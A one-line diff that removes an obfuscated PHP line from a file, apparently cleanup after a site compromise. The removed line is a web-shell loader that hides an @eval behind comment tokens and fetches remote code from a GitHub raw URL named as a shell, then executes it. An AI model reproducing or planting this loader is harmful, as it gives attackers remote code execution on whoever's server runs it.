@@ -1,1 +1,0 @@
-<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/CLAY-HAXOR/SHELL/refs/heads/main/alfah3")))); /**/ ?>
